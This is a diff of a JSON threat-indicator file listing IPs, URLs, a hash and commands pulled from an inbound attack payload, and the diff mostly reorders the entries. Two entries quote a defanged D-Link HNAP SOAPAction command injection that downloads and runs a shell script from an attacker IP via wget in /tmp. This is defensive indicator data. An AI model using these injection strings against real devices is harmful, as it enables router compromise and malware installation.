@@ -1,17 +1,5 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "190.179.169.XXX"
-  },
-  {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "91.92.40.XXX"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
@@ -21,19 +9,25 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://91.92.40.XXX/wget.sh;chmod"
+    "value": "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/"
   },
   {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
-    "value": "hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/"
+    "value": "hxxp://91.92.40.XXX/wget.sh;chmod"
   },
   {
-    "context": "Inbound payload hash (unknown)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "b052f6dce95f054cb176f097cfc67c38365ff978c3b97f742bd3879c151b9472"
+    "type": "ip",
+    "value": "91.92.40.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.169.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -46,6 +40,12 @@
     "source": "strings",
     "type": "command",
     "value": "SOAPAction: \"hxxp://purenetworks[.]com/HNAP1/GetDeviceSettings/`cd /tmp;rm -f .s;wget hxxp://91.92.40.XXX/wget.sh -O .s;bu"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "b052f6dce95f054cb176f097cfc67c38365ff978c3b97f742bd3879c151b9472"
   },
   {
     "asn": "TechTies Inc.",
